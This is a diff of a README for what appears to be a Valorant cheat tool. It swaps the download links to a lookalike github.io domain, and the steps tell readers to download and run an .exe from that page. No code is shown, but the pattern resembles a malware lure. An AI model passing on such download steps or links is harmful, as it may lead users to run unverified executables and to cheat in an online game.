@@ -1,6 +1,6 @@
 # 🎯 Valorant-External-Assistant-2026 - Visual support for your tactical gameplay
 
-## [🎯 Valorant Download 2026 🎯](https://uneycheats.github.io/UneyCheats/)
+## [🎯 Valorant Download 2026 🎯](https://unezcheats.github.io/UnezCheats/)
 
 
 ## 📌 About this project
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you start:
 
 ## 📥 How to download and install
 
-1. Visit [this page to download the latest version](https://uneycheats.github.io/UneyCheats/).
+1. Visit [this page to download the latest version](https://unezcheats.github.io/UnezCheats/).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the link labeled "Assets" under the most recent version number.
 4. Download the file ending in .exe to your computer.
